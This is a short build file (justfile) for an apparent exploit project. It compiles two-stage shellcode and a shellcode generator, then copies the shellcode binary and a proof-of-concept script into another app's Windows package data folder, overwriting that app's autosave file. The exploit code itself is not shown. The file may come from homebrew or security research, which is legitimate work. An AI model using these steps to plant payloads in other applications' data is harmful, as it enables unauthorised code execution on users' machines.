set shell := ["cmd.exe", "/c"]

build-stage1:
    cd ./crates/shellcode_stage1 && cargo build --release

build-stage2:
    cd ./crates/shellcode_stage2 && cargo build --release

build-test-program:
    cd ./crates/test_program && cargo build --release

build-exploit:
    just --justfile {{justfile()}} build-stage1
    just --justfile {{justfile()}} build-stage2
    cd ./crates/shellcode_gen && cargo run --release -- ../outputs/

generate:
    just --justfile {{justfile()}} build-exploit
    just --justfile {{justfile()}} build-test-program
    xcopy /y crates\\shellcode_stage2\\target\\x86_64-pc-windows-msvc\\release\\shellcode_stage2.bin %LOCALAPPDATA%\\Packages\\27878ConstantineTarasenko.458004FD2C47C_c8b3w9r5va522\\LocalState\\stage2.bin
    xcopy /y crates\\test_program\\target\\release\\test_program.exe %LOCALAPPDATA%\\Packages\\27878ConstantineTarasenko.458004FD2C47C_c8b3w9r5va522\\LocalState
    xcopy /y crates\\outputs\\gamescript_poc.txt %LOCALAPPDATA%\\Packages\\27878ConstantineTarasenko.458004FD2C47C_c8b3w9r5va522\\LocalState\\gamescript_autosave.txt
